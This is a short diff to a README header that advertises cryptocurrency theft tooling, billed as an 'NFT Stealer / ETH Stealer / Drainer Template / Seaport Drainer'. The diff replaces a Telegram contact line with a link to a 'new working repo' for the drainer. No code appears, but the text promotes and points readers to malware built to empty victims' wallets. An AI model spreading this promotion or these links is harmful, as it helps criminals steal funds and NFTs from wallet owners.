@@ -1,4 +1,4 @@
-### If you have questions or need any help, Message me here: [@crypto_scem](https://t.me/crypto_scem) 
+# https://github.com/monkeydrainer/seaportdrainer (new working repo)
 ---
 ## 🖼️ NFT Stealer / ETH Stealer / Drainer Template / ETH Drainer / NFT Drainer / Seaport Drainer
 ---
